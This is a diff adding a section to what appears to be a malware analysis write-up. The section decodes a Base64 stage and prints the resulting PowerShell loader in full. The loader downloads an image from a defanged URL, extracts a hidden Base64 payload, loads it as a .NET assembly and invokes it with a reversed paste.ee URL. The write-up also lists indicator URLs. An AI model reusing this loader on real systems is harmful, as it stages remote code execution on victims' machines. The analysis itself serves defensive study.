@@ -63,4 +63,37 @@ We can then work out parts of the script, simply by reversing the strings for th
 
 ![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/9838b0c5-600c-4c17-bab6-ef82d75c67a9)
 
+The Base64 element can be analysed by utilising the following Operators in CyberChef:
+
+![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/de584242-bd66-4c9e-b305-39a9e120e00b)
+
+Which reveals the following:
+
+``` powershell
+$imageUrl = 'hxxps[://]uploaddeimagens.com[.]br/images/004/691/257/original/js.jpg?1702591609';$webClient = New-Object System.Net.WebClient;$imageBytes = $webClient.DownloadData($imageUrl);$imageText = [System.Text.Encoding]::UTF8.GetString($imageBytes);$startFlag = '<<BASE64_START>>';$endFlag =
+'<<BASE64_END>>';$startIndex = $imageText.IndexOf($startFlag);$endIndex = $imageText.IndexOf($endFlag);$startIndex -ge 0 -and $endIndex -gt $startIndex;$startIndex += $startFlag.Length;$base64Length = $endIndex - $startIndex;$base64Command = $imageText.Substring($startIndex, $base64Length);$commandBytes =
+[System.Convert]::FromBase64String($base64Command);$loadedAssembly = [System.Reflection.Assembly]::Load($commandBytes);$type = $loadedAssembly.GetType('ClassLibrary3.Class1');$method = $type.GetMethod('Run').Invoke($null, [object[]] ('0/iK75U/d/ee.etsap//:sptth' , '' , '2' , 'VbsName' , '1' , 'C:\ProgramData\',
+'LnkName'))
+```
+
+There are 2 interesting URLs within this command block:
+
+[-] hxxps[://]uploaddeimagens.com[.]br/images/004/691/257/original/js.jpg?1702591609
+
+[-] hxxps[://]paste[.]ee/d/U57Ki/0
+
+For the first URL, it reads the bytes in between 2 flags present in the strings of an image file and executes them.
+
+We can extract this too by downloading the image, running a strings command, and extracting the code between the <<BASE64_START>> and <<BASE64_END>> flags.
+
+![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/87dd46b6-366f-44d2-8768-9c26fae6b070)
+
+![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/7ae91d50-d7f6-42f1-8b17-eaf7dee97fdf)
+
+When decoding this from Base64 we are given an executable file.
+
+
+
+
+
 
